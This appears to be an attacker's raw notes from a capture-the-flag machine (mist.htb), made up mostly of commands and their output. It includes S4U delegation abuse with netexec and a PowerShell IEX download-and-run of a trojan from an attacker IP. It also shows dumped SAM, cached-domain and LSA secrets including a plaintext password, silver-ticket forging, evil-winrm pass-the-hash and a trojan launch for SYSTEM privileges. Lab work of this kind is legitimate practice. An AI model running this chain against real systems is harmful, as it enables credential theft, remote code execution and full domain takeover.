# MS01 dump with machine account delegation

proxychains4  netexec smb 192.168.100.101 -u 'ms01$' -H 4a74fc05400345d580cf58aec3e6d833 --self  --delegate 'administrator' -x 'C:\xampp\htdocs\trojan.exe'


proxychains4  netexec smb 192.168.100.101 -u 'ms01$' -H 4a74fc05400345d580cf58aec3e6d833 --self  --delegate 'administrator' --sam -X "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.14:8890/ams');IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.14:8890/trojan.ps1');"
[proxychains] config file found: /opt/homebrew/etc/proxychains.conf
[proxychains] preloading /opt/homebrew/Cellar/proxychains-ng/4.17/lib/libproxychains4.dylib
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:135  ...  OK
SMB         192.168.100.101 445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  MS01.mist.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  MS01.mist.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  MIST.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  MIST.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:88  ...  OK
SMB         192.168.100.101 445    MS01             [+] mist.htb\administrator through S4U with ms01$ (Pwn3d!)
SMB         192.168.100.101 445    MS01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::
SMB         192.168.100.101 445    MS01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.100.101 445    MS01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.100.101 445    MS01             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:90f903787dd064cc1973c3aa4ca4a7c1:::
SMB         192.168.100.101 445    MS01             svc_web:1000:aad3b435b51404eeaad3b435b51404ee:76a99f03b1d2656e04c39b46e16b48c8:::

> Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::
> svc_web:1000:aad3b435b51404eeaad3b435b51404ee:76a99f03b1d2656e04c39b46e16b48c8:


SMB         192.168.100.101 445    MS01             MIST.HTB/Brandon.Keywarp:$DCC2$10240#Brandon.Keywarp#5f540c9ee8e4bfb80e3c732ff3e12b28: (2024-04-04 10:18:58)
SMB         192.168.100.101 445    MS01             MIST.HTB/op_Sharon.Mullard:$DCC2$10240#op_Sharon.Mullard#9dc24204e1e111afb23435119651a1e0: (2024-04-04 08:20:15)
SMB         192.168.100.101 445    MS01             MIST\MS01$:plain_password_hex:05026d28f0211624b80e3d04c599ea354667703a1ec85f78c0f38461197626bc4559dfd5185954984799ec09048e8e6a918c5fb423814d50fedc3c62631450d8439ba072994bf4aad5311fa4055f410e0ee6b5b849b33e62ff0f7af03b1a7787287bb6b5987096a3d3240b05f2241d6144900c0071b48419bde5cb38ab24e8977f64ceb09d0efeea7de1501c041504fb4742bd40403ae30589ca354c71684607c8a36f86a6f1df40abb3e45f4265fa1aef2339f85f40e32b74a3a1ec173c1dfce0528977aafeac71ba97e95826e3d31f0aeb3d67a04efcd4740cc38a94c64f585c5f0047c728f6061174f7d5e6215eb9
SMB         192.168.100.101 445    MS01             MIST\MS01$:aad3b435b51404eeaad3b435b51404ee:4a74fc05400345d580cf58aec3e6d833:::
SMB         192.168.100.101 445    MS01             
dpapi_machinekey:0xe464e18478cf4a7d809dfc9f5d6b5230ce98779b
dpapi_userkey:0x579d7a06798911d322fedc960313e93a71b43cc2
SMB         192.168.100.101 445    MS01             NL$KM:57c8f7cd24f255eb191d07c2158421b0907c793cd5becfacef404f8e2a763f000487df47cfd8b7af6d5eee9f165e75f38024aa24b07d3c294fea4e4afb264e62
SMB         192.168.100.101 445    MS01             svc_web:MostSavagePasswordEver123

die 
```
proxychains4 getTGT.py mist.htb/'ms01$' -hashes :4a74fc05400345d580cf58aec3e6d833 -dc-ip 192.168.100.100  

ticketer.py -spn 'cifs/ms01.mist.htb' -nthash '4a74fc05400345d580cf58aec3e6d833' -debug -domain 'mist.htb' -domain-sid 'S-1-5-21-1045809509-3006658589-2426055941' 'Administrator'

export KRB5CCNAME=administrator.ccache
proxychains4 wmiexec.py -k -no-pass ///
```

## Rce with winrm (proxied)

> proxychains4 evil-winrm -i 192.168.100.101 -u 'administrator' --hash 711e6a685af1c31c4029c3c7681dd97b 

cd C:\xampp\htdocs;.\trojan.exe

> getsystem -t 4